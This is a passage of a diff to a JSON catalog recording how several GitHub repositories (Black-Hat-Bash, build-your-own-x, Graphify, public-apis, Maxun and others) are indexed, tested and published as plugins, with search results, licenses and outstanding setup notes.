+                    "content_sha256": "84542daad7e1995ba8fbbb71869c0bbeee3d06f35dc96ef05c7d5b6d1e600fe8"
+                  }
+                ],
+                "vectorized": false
+              }
+            },
+            {
+              "tool": "black_hat_bash__status",
+              "arguments": {},
+              "result": {
+                "chunks": 64,
+                "nodes": 0,
+                "edges": 0,
+                "vectorized": false,
+                "source_url": "https://github.com/dolevf/Black-Hat-Bash.git",
+                "source_revision": "92d9287305255aab1e433cd54755acf21f5bd3f9"
+              }
+            },
+            {
+              "tool": "black_hat_bash__refresh",
+              "arguments": {},
+              "result": {
+                "chunks": 64,
+                "nodes": 0,
+                "edges": 0,
+                "vectorized": false,
+                "source_url": "https://github.com/dolevf/Black-Hat-Bash.git",
+                "source_revision": "92d9287305255aab1e433cd54755acf21f5bd3f9"
+              }
+            }
+          ],
+          "lifecycle": [
+            "install",
+            "disable",
+            "enable",
+            "uninstall"
+          ],
+          "temporary_data_removed": true,
+          "generation_evidence": "reviewed proposal fixture",
+          "publication": {
+            "state": "published",
+            "input_digest": "0d667e3c8a4a546ad75575e48312dcdffd59826fc9f36b7c96701220cbb27a65",
+            "digest": "0d667e3c8a4a546ad75575e48312dcdffd59826fc9f36b7c96701220cbb27a65",
+            "extension_id": "black-hat-bash",
+            "version": "1.0.0",
+            "artifact_url": "https://github.com/MADPANDA3D/Pandamonium/releases/download/plugin-black-hat-bash-1.0.0-0d667e3c8a4a546ad75575e48312dcdffd59826fc9f36b7c96701220cbb27a65/pandamonium-plugin-black-hat-bash-0d667e3c8a4a546ad75575e48312dcdffd59826fc9f36b7c96701220cbb27a65.tar.gz",
+            "catalog_generated_at": "2026-09-16T00:11:50.431416+00:00",
+            "validation": {
+              "kind": "isolated_operations",
+              "checks": 3
+            }
+          }
+        }
+      ],
+      "coverage": "Real native knowledge status, cited search and refresh over README and chapter scripts as text.",
+      "outstanding": "No lab/example execution. Optional WordPress credential-shaped JS examples excluded; retain all shipped license notices.",
+      "license": "MIT original examples; bundled licenses retained",
+      "status": "published_with_declared_coverage"
+    },
+    {
+      "number": 25,
+      "name": "build-your-own-x",
+      "requested_source": "https://github.com/codecrafters-io/build-your-own-x",
+      "target": "Graphify, then vectorize for native knowledge use",
+      "resolved_source": "https://github.com/codecrafters-io/build-your-own-x",
+      "source_revision": "aa17439b62f384511a5561ce308e9598b94d8989",
+      "packages": [
+        {
+          "extension_id": "build-your-own-x",
+          "recipe": "integrations/repository-packages/build-your-own-x/proposal.json",
+          "source_revision": "aa17439b62f384511a5561ce308e9598b94d8989",
+          "prepared_sha256": "ee3fd2e11f61e95fc9656be54b0bd881a778b94c6a555d5d8dda94b3cde7eedc",
+          "prepared_version": "1.0.0",
+          "operations": [
+            {
+              "tool": "build_your_own_x__status",
+              "arguments": {},
+              "result": {
+                "chunks": 27,
+                "nodes": 36,
+                "edges": 35,
+                "vectorized": true,
+                "source_url": "https://github.com/codecrafters-io/build-your-own-x.git",
+                "source_revision": "aa17439b62f384511a5561ce308e9598b94d8989"
+              }
+            },
+            {
+              "tool": "build_your_own_x__search",
+              "arguments": {
+                "query": "Build your own database",
+                "limit": 3
+              },
+              "result": {
+                "results": [
+                  {
+                    "path": "README.md",
+                    "line": 148,
+                    "text": "* [**Go**: _Build Your Own Redis from Scratch_](https://www.build-redis-from-scratch.dev/)\n* [**JavaScript**: _Dagoba: an in-memory graph database_](http://aosabook.org/en/500L/dagoba-an-in-memory-graph-database.html)\n* [**Python**: _DBDB: Dog Bed Database_](http://aosabook.org/en/500L/dbdb-dog-bed-database.html)\n* [**Python**: _Write your own miniature Redis with Python_](http://charlesleifer.com/blog/building-a-simple-redis-server-with-python/)\n* [**Ruby**: _Build your own fast, persistent KV store in Ruby_](https://dineshgowda.com/posts/build-your-own-persistent-kv-store/)\n* [**Rust**: _Build your own Redis client and server_](https://tokio.rs/tokio/tutorial/setup)\n\n#### Build your own `Docker`\n\n* [**C**: _Linux containers in 500 lines of code_](https://blog.lizzie.io/linux-containers-in-500-loc.html)\n* [**Go**: _Build Your Own Container Using Less than 100 Lines of Go_](https://www.infoq.com/articles/build-a-container-golang)\n* [**Go**: _Building a container from scratch in Go_](https://www.youtube.com/watch?v=8fi7uSYlOdc) [video]\n* [**Python**: _A workshop on Linux containers: Rebuild Docker from Scratch_](https://github.com/Fewbytes/rubber-docker)\n* [**Python**: _A proof-of-concept imitation of Docker, written in 100% Python_](https://github.com/tonybaloney/mocker)\n* [**Shell**: _Docker implemented in around 100 lines of bash_](https://github.com/p8952/bocker)\n\n#### Build your own `Emulator / Virtual Machine`\n\n* [**C**: _Home-grown bytecode interpreters_](https://medium.com/bumble-tech/home-grown-bytecode-interpreters-51e12d59b25c)\n* [**C**: _Virtual machine in C_](http://web.archive.org/web/20200121100942/https://blog.felixangell.com/virtual-machine-in-c/)\n* [**C**: _Write your Own Virtual Machine_](https://justinmeiners.github.io/lc3-vm/)\n",
+                    "source_url": "https://github.com/codecrafters-io/build-your-own-x/blob/aa17439b62f384511a5561ce308e9598b94d8989/README.md",
+                    "source_revision": "aa17439b62f384511a5561ce308e9598b94d8989",
+                    "content_sha256": "b98b0a65ba3429edc627dcfde8689436b04164cf2e81ed70350e78bbd5ab8193"
+                  },
+                  {
+                    "path": "README.md",
+                    "line": 391,
+                    "text": "* [**Python**: _Approach: Building a toy template engine in Python_](http://alexmic.net/building-a-template-engine/)\n* [**Python**: _A Template Engine_](http://aosabook.org/en/500L/a-template-engine.html)\n* [**Ruby**: _How to write a template engine in less than 30 lines of code_](http://bits.citrusbyte.com/how-to-write-a-template-library/)\n\n#### Build your own `Text Editor`\n\n* [**C**: _Build Your Own Text Editor_](https://viewsourcecode.org/snaptoken/kilo/)\n* [**C++**: _Designing a Simple Text Editor_](http://www.fltk.org/doc-1.1/editor.html)\n* [**Python**: _Python Tutorial: Make Your Own Text Editor_](https://www.youtube.com/watch?v=xqDonHEYPgA) [video]\n* [**Python**: _Create a Simple Python Text Editor!_](http://www.instructables.com/id/Create-a-Simple-Python-Text-Editor/)\n* [**Ruby**: _Build a Collaborative Text Editor Using Rails_](https://blog.aha.io/text-editor/)\n* [**Rust**: _Hecto: Build your own text editor in Rust_ ](https://www.flenker.blog/hecto/)\n\n#### Build your own `Visual Recognition System`\n\n* [**Python**: _Developing a License Plate Recognition System with Machine Learning in Python_](https://medium.com/devcenter/developing-a-license-plate-recognition-system-with-machine-learning-in-python-787833569ccd)\n* [**Python**: _Building a Facial Recognition Pipeline with Deep Learning in Tensorflow_](https://hackernoon.com/building-a-facial-recognition-pipeline-with-deep-learning-in-tensorflow-66e7645015b8)\n\n#### Build your own `Voxel Engine`\n\n* [**C++**: _Let's Make a Voxel Engine_](https://sites.google.com/site/letsmakeavoxelengine/home)\n\n#### Build your own `Web Browser`\n\n* [**Rust**: _Let's build a browser engine_](https://limpet.net/mbrubeck/2014/08/08/toy-layout-engine-1.html)\n* [**Python**: _Browser Engineering_](https://browser.engineering)\n\n",
+                    "source_url": "https://github.com/codecrafters-io/build-your-own-x/blob/aa17439b62f384511a5561ce308e9598b94d8989/README.md",
+                    "source_revision": "aa17439b62f384511a5561ce308e9598b94d8989",
+                    "content_sha256": "2eaa87f3331dafdb49bf922b716a914fdfb608d1e7ef06227332bc6de452c901"
+                  },
+                  {
+                    "path": "README.md",
+                    "line": 418,
+                    "text": "#### Build your own `Web Server`\n\n* [**C#**: _Writing a Web Server from Scratch_](https://www.codeproject.com/Articles/859108/Writing-a-Web-Server-from-Scratch)\n* [**Node.js**: _Build Your Own Web Server From Scratch In JavaScript_](https://build-your-own.org/webserver/)\n* [**Node.js**: _Let's code a web server from scratch with NodeJS Streams_](https://www.codementor.io/@ziad-saab/let-s-code-a-web-server-from-scratch-with-nodejs-streams-h4uc9utji)\n* [**Node.js**: _lets-build-express_](https://github.com/antoaravinth/lets-build-express)\n* [**PHP**: _Writing a webserver in pure PHP_](http://station.clancats.com/writing-a-webserver-in-pure-php/)\n* [**Python**: _A Simple Web Server_](http://aosabook.org/en/500L/a-simple-web-server.html)\n* [**Python**: _Let\u2019s Build A Web Server._](https://ruslanspivak.com/lsbaws-part1/)\n* [**Python**: _Web application from scratch_](https://defn.io/2018/02/25/web-app-from-scratch-01/)\n* [**Python**: _Building a basic HTTP Server from scratch in Python_](http://joaoventura.net/blog/2017/python-webserver/)\n* [**Python**: _Implementing a RESTful Web API with Python & Flask_](http://blog.luisrei.com/articles/flaskrest.html)\n* [**Ruby**: _Building a simple websockets server from scratch in Ruby_](http://blog.honeybadger.io/building-a-simple-websockets-server-from-scratch-in-ruby/)\n\n#### Uncategorized\n\n* [**(any)**: _From NAND to Tetris: Building a Modern Computer From First Principles_](http://nand2tetris.org/)\n* [**(any)**:  build-your-own-x-vibe-coding: BYOX-style tutorials adapted for vibe coding](https://github.com/inFaaa/build-your-own-x-vibe-coding)\n* [**Alloy**: _The Same-Origin Policy_](http://aosabook.org/en/500L/the-same-origin-policy.html)\n",
+                    "source_url": "https://github.com/codecrafters-io/build-your-own-x/blob/aa17439b62f384511a5561ce308e9598b94d8989/README.md",
+                    "source_revision": "aa17439b62f384511a5561ce308e9598b94d8989",
+                    "content_sha256": "b70c033e9c2ed2926540b81ed6343e8f550b9fc16c4241f96ba0dbc8eb8494c0"
+                  }
+                ],
+                "vectorized": true
+              }
+            },
+            {
+              "tool": "build_your_own_x__refresh",
+              "arguments": {},
+              "result": {
+                "chunks": 27,
+                "nodes": 36,
+                "edges": 35,
+                "vectorized": true,
+                "source_url": "https://github.com/codecrafters-io/build-your-own-x.git",
+                "source_revision": "aa17439b62f384511a5561ce308e9598b94d8989"
+              }
+            }
+          ],
+          "lifecycle": [
+            "install",
+            "disable",
+            "enable",
+            "uninstall"
+          ],
+          "temporary_data_removed": true,
+          "generation_evidence": "reviewed proposal fixture",
+          "publication": {
+            "state": "not_published",
+            "reason": "Publication blocked: no upstream project license found. Linked tutorials/tools retain their own rights and are not executed."
+          }
+        }
+      ],
+      "coverage": "Real Graphify Markdown extraction (36 nodes/35 edges), 27 indexed chunks, real local FastEmbed vectors, cited native search and refresh.",
+      "outstanding": "Publication blocked: no upstream project license found. Linked tutorials/tools retain their own rights and are not executed.",
+      "license": "No upstream project license found",
+      "status": "outstanding"
+    },
+    {
+      "number": 26,
+      "name": "Graphify",
+      "requested_source": "https://github.com/Graphify-Labs/graphify",
+      "target": "Knowledge/codebase graph integration",
+      "resolved_source": "https://github.com/Graphify-Labs/graphify",
+      "source_revision": "c7ec1082083e3e876443f643ecf86ebcfae177c2",
+      "packages": [
+        {
+          "extension_id": "graphify",
+          "recipe": "integrations/repository-packages/graphify/proposal.json",
+          "source_revision": "c7ec1082083e3e876443f643ecf86ebcfae177c2",
+          "prepared_sha256": "29a1ce7cfcfe63be1eaa8a8994109f5747523872af7b16e6e35f5e9dea2aa3a8",
+          "prepared_version": "1.0.0",
+          "operations": [
+            {
+              "tool": "graphify__markdown_graph",
+              "arguments": {
+                "path": "/package/README.md"
+              },
+              "result": {
+                "nodes": 27,
+                "edges": 33,
+                "artifact": "/runtime/artifacts/graph.json"
+              }
+            }
+          ],
+          "lifecycle": [
+            "install",
+            "disable",
+            "enable",
+            "uninstall"
+          ],
+          "temporary_data_removed": true,
+          "generation_evidence": "reviewed proposal fixture",
+          "publication": {
+            "state": "published",
+            "input_digest": "29a1ce7cfcfe63be1eaa8a8994109f5747523872af7b16e6e35f5e9dea2aa3a8",
+            "digest": "29a1ce7cfcfe63be1eaa8a8994109f5747523872af7b16e6e35f5e9dea2aa3a8",
+            "extension_id": "graphify",
+            "version": "1.0.0",
+            "artifact_url": "https://github.com/MADPANDA3D/Pandamonium/releases/download/plugin-graphify-1.0.0-29a1ce7cfcfe63be1eaa8a8994109f5747523872af7b16e6e35f5e9dea2aa3a8/pandamonium-plugin-graphify-29a1ce7cfcfe63be1eaa8a8994109f5747523872af7b16e6e35f5e9dea2aa3a8.tar.gz",
+            "catalog_generated_at": "2026-09-16T00:13:42.957862+00:00",
+            "validation": {
+              "kind": "isolated_operations",
+              "checks": 1
+            }
+          }
+        }
+      ],
+      "coverage": "Real Graphify Markdown extractor builds nodes/edges and graph.json through the mounted native tool.",
+      "outstanding": "Partial requested coverage: deterministic Markdown structure verified; other language/code extractors and model-inferred relations are not advertised. Input must be in package/private artifacts.",
+      "license": "Apache-2.0 and MIT",
+      "status": "published_with_declared_coverage"
+    },
+    {
+      "number": 27,
+      "name": "public-apis",
+      "requested_source": "https://github.com/public-apis/public-apis",
+      "target": "API discovery and guided endpoint/credential setup",
+      "resolved_source": "https://github.com/public-apis/public-apis",
+      "source_revision": "536d5c4e5ff25e16c0f27e6bda4c9308ffc5fd33",
+      "packages": [
+        {
+          "extension_id": "public-apis",
+          "recipe": "integrations/repository-packages/public-apis/proposal.json",
+          "source_revision": "536d5c4e5ff25e16c0f27e6bda4c9308ffc5fd33",
+          "prepared_sha256": "90c845448a2f4124bd9d131a2d5cad77059ae4d4bc75455443a7f7ec857dc567",
+          "prepared_version": "1.0.0",
+          "operations": [
+            {
+              "tool": "public_apis__search",
+              "arguments": {
+                "query": "weather",
+                "limit": 3
+              },
+              "result": {
+                "results": [
+                  {
+                    "path": "README.md",
+                    "line": 2293,
+                    "text": "| [RainViewer](https://www.rainviewer.com/api.html) | Radar data collected from different websites across the Internet | No | Yes | Unknown |\n| [Storm Glass](https://stormglass.io/) | Global marine weather from multiple sources | `apiKey` | Yes | Yes |\n| [Tomorrow](https://docs.tomorrow.io) | Weather API Powered by Proprietary Technology | `apiKey` | Yes | Unknown |\n| [US Weather](https://www.weather.gov/documentation/services-web-api) | US National Weather Service | No | Yes | Yes |\n| [Visual Crossing](https://www.visualcrossing.com/weather-api) | Global historical and weather forecast data | `apiKey` | Yes | Yes |\n| [weather-api](https://github.com/robertoduessmann/weather-api) | A RESTful free API to check the weather | No | Yes | No |\n| [WeatherAPI](https://www.weatherapi.com/) | Weather API with other stuff like Astronomy and Geolocation API | `apiKey` | Yes | Yes |\n| [Weatherbit](https://www.weatherbit.io/api) | Weather | `apiKey` | Yes | Unknown |\n| [WeatherTotals](https://weathertotals.com/api) | Measured US snow, rain, hail and aurora totals by state and city | No | Yes | Yes |\n| [World Time & Weather](https://worldtimeweather.com/api.html) | Current weather, local time, UTC offset and DST rules for 400 cities as static JSON | No | Yes | Yes |\n| [wttr.in](https://wttr.in/:help) | Weather in your terminal, supports JSON output | No | Yes | Yes |\n| [Yandex.Weather](https://yandex.com/dev/weather/) | Assesses weather condition in specific locations | `apiKey` | Yes | No |\n\n**[\u2b06 Back to Index](#index)**\n<br >\n<br >\n\n<br>\n\n## License\n[MIT](LICENSE) (c) 2022 public-apis\n",
+                    "source_url": "https://github.com/public-apis/public-apis/blob/536d5c4e5ff25e16c0f27e6bda4c9308ffc5fd33/README.md",
+                    "source_revision": "536d5c4e5ff25e16c0f27e6bda4c9308ffc5fd33",
+                    "content_sha256": "d156d5484863529f6f290fde30f5ef26523d237333fc29b3a14fdb5b8d7812f1"
+                  },
+                  {
+                    "path": "README.md",
+                    "line": 2279,
+                    "text": "| [Meltema](https://meltema.com/docs) | Multi-model weather: GFS, ECMWF AIFS/IFS and a 31-member GEFS ensemble, keyless point forecasts | No | Yes | No |\n| [M\u00e9t\u00e9o-France](https://portail-api.meteofrance.fr/) | French weather forecasts and alerts | `apiKey` | Yes | Unknown |\n| [Meteorologisk Institutt](https://api.met.no/weatherapi/documentation) | Weather and climate data | `User-Agent` | Yes | Unknown |\n| [Micro Weather](https://m3o.com/weather/api) | Real time weather forecasts and historic data | `apiKey` | Yes | Unknown |\n| [ODWeather](http://api.oceandrivers.com/static/docs.html) | Weather and weather webcams | No | No | Unknown |\n| [Oikolab](https://docs.oikolab.com) | 70+ years of global, hourly historical and forecast weather data from NOAA and ECMWF | `apiKey` | Yes | Yes |\n| [Open-Meteo](https://open-meteo.com/) | Global weather forecast API for non-commercial use | No | Yes | Yes |\n| [Open-Meteo Ensemble](https://open-meteo.com/en/docs/ensemble-api) | Weather ensemble forecasts from multiple models | No | Yes | Yes |\n| [openSenseMap](https://api.opensensemap.org/) | Data from Personal Weather Stations called senseBoxes | No | Yes | Yes |\n| [OpenUV](https://www.openuv.io) | Real-time UV Index Forecast | `apiKey` | Yes | Unknown |\n| [OpenWeatherMap](https://openweathermap.org/api) | Weather | `apiKey` | Yes | Unknown |\n| [Pirate Weather](https://pirateweather.net/en/latest/) | Free weather API with forecast data similar to Dark Sky | No | Yes | Yes |\n| [QWeather](https://dev.qweather.com/en/) | Location-based weather data | `apiKey` | Yes | Yes |\n| [Rainbow Weather](https://developer.rainbow.ai/) | Global real-time nowcasting API powered by radar + satellite fusion | `apiKey` | Yes | Unknown |\n",
+                    "source_url": "https://github.com/public-apis/public-apis/blob/536d5c4e5ff25e16c0f27e6bda4c9308ffc5fd33/README.md",
+                    "source_revision": "536d5c4e5ff25e16c0f27e6bda4c9308ffc5fd33",
+                    "content_sha256": "b9f7f7b92a0b228caaf945de59df42f4ea0172dbbe3f388740403fa90003a72f"
+                  },
+                  {
+                    "path": "README.md",
+                    "line": 2265,
+                    "text": "| [7Timer!](http://www.7timer.info/doc.php?lang=en) | Weather, especially for Astroweather | No | No | Unknown |\n| [AccuWeather](https://developer.accuweather.com/apis) | Weather and forecast data | `apiKey` | No | Unknown |\n| [Aemet](https://opendata.aemet.es/centrodedescargas/inicio) | Weather and forecast data from Spain | `apiKey` | Yes | Unknown |\n| [APIXU](https://www.apixu.com/doc/request.aspx) | Weather | `apiKey` | Yes | Unknown |\n| [AQICN](https://aqicn.org/api/) | Air Quality Index Data for over 1000 cities | `apiKey` | Yes | Unknown |\n| [AviationWeather](https://www.aviationweather.gov/dataserver) | NOAA aviation weather forecasts and observations | No | Yes | Unknown |\n| [ColorfulClouds](https://open.caiyunapp.com/ColorfulClouds_Weather_API) | Weather | `apiKey` | Yes | Yes |\n| [Euskalmet](https://opendata.euskadi.eus/api-euskalmet/-/api-de-euskalmet/) | Meteorological data of the Basque Country | `apiKey` | Yes | Unknown |\n| [Foreca](https://developer.foreca.com) | Weather | `OAuth` | Yes | Unknown |\n| [Hail History](https://hail-history-noaa.netlify.app/api-docs.html) | Radar-detected hail history for any US address from NOAA NEXRAD Level-III hail detections, by year | No | Yes | Yes |\n| [HG Weather](https://hgbrasil.com/status/weather) | Provides weather forecast data for cities in Brazil | `apiKey` | Yes | Yes |\n| [Hong Kong Obervatory](https://www.hko.gov.hk/en/abouthko/opendata_intro.htm) | Provide weather information, earthquake information, and climate data | No | Yes | Unknown |\n| [IPMA](https://api.ipma.pt/open-data/) | Portuguese weather and climate data | No | Yes | Unknown |\n| [KNMI](https://developer.dataplatform.knmi.nl/) | Dutch weather, radar and climate data | `apiKey` | Yes | Unknown |\n",
+                    "source_url": "https://github.com/public-apis/public-apis/blob/536d5c4e5ff25e16c0f27e6bda4c9308ffc5fd33/README.md",
+                    "source_revision": "536d5c4e5ff25e16c0f27e6bda4c9308ffc5fd33",
+                    "content_sha256": "c0b477e076ab1f2b34e6b3268c0044bc350a82ce8219e4d9c71df1358af723ea"
+                  }
+                ],
+                "vectorized": false
+              }
+            },
+            {
+              "tool": "public_apis__status",
+              "arguments": {},
+              "result": {
+                "chunks": 148,
+                "nodes": 0,
+                "edges": 0,
+                "vectorized": false,
+                "source_url": "https://github.com/public-apis/public-apis.git",
+                "source_revision": "536d5c4e5ff25e16c0f27e6bda4c9308ffc5fd33"
+              }
+            },
+            {
+              "tool": "public_apis__refresh",
+              "arguments": {},
+              "result": {
+                "chunks": 148,
+                "nodes": 0,
+                "edges": 0,
+                "vectorized": false,
+                "source_url": "https://github.com/public-apis/public-apis.git",
+                "source_revision": "536d5c4e5ff25e16c0f27e6bda4c9308ffc5fd33"
+              }
+            }
+          ],
+          "lifecycle": [
+            "install",
+            "disable",
+            "enable",
+            "uninstall"
+          ],
+          "temporary_data_removed": true,
+          "generation_evidence": "reviewed proposal fixture",
+          "publication": {
+            "state": "published",
+            "input_digest": "90c845448a2f4124bd9d131a2d5cad77059ae4d4bc75455443a7f7ec857dc567",
+            "digest": "90c845448a2f4124bd9d131a2d5cad77059ae4d4bc75455443a7f7ec857dc567",
+            "extension_id": "public-apis",
+            "version": "1.0.0",
+            "artifact_url": "https://github.com/MADPANDA3D/Pandamonium/releases/download/plugin-public-apis-1.0.0-90c845448a2f4124bd9d131a2d5cad77059ae4d4bc75455443a7f7ec857dc567/pandamonium-plugin-public-apis-90c845448a2f4124bd9d131a2d5cad77059ae4d4bc75455443a7f7ec857dc567.tar.gz",
+            "catalog_generated_at": "2026-09-16T00:12:04.762617+00:00",
+            "validation": {
+              "kind": "isolated_operations",
+              "checks": 3
+            }
+          }
+        }
+      ],
+      "coverage": "Real native status, cited API-directory search and refresh. Returned entries show endpoint docs and authentication/CORS information.",
+      "outstanding": "This is API discovery; each selected endpoint still needs its own credentials, terms and integration setup.",
+      "license": "MIT",
+      "status": "published_with_declared_coverage"
+    },
+    {
+      "number": 28,
+      "name": "Maxun",
+      "requested_source": "https://github.com/getmaxun/maxun",
+      "target": "Service/automation integration",
+      "resolved_source": "https://github.com/getmaxun/maxun",
+      "source_revision": "5b946a3d7c0676e53da92900c311e5ab21af4772",
+      "packages": [],
+      "coverage": "Pinned Maxun service source and deployment requirements inspected; static audit completed.",
+      "outstanding": "Needs setup: disposable Postgres, Redis, MinIO and browser services with owner configuration. Required server/auth/database files have secret-like findings; do not delete required source to evade the audit. Recording/run operation proof remains outstanding.",
+      "license": "AGPL-3.0",
+      "status": "outstanding",
+      "static_scan": {
+        "repo_class": "node_cli",
+        "licenses": [
+          "AGPL-3.0"
+        ],
+        "error": null,
+        "has_installable_draft": false,
+        "finding_categories": [
+          "secret"
+        ]
+      }
+    },
+    {
+      "number": 29,
+      "name": "Stirling PDF",
+      "requested_source": "https://github.com/Stirling-Tools/stirling-pdf",
+      "target": "Held-out document service URL",
+      "resolved_source": null,
+      "source_revision": null,
+      "packages": [],
+      "status": "held_out_MAD-964",
+      "coverage": "Intentionally not fetched, adapted, installed or published by this task.",
+      "outstanding": "MAD-964 must evaluate the fresh URL without repository-specific core support.",
+      "license": null
+    },
+    {
+      "number": 30,
+      "name": "Unsloth Studio",
+      "requested_source": "Existing external-runtime adapter, MAD-796",
+      "target": "Resolve exact repository/version from existing adapter before publication; preserve external-node configuration",
+      "resolved_source": "https://github.com/unslothai/unsloth",
+      "source_revision": "af4e98e2f63f1907eb4b5d5f8b9375311d9b667a",
+      "packages": [],
+      "coverage": "Resolved existing MAD-796 external adapter to unslothai/unsloth, exact source commit, studio/ subtree and v1 adapter contract.",
+      "outstanding": "Needs setup: chosen external GPU/model runtime and token, plus real health/train/status/artifact checks. Preserve existing node configuration. Studio package version 0.0.0 is a build holder, not a released version; use immutable source pin until runtime release is identified.",
+      "license": "Studio AGPL-3.0-only; root library Apache-2.0",
+      "status": "outstanding"
+    }
+  ]
+}
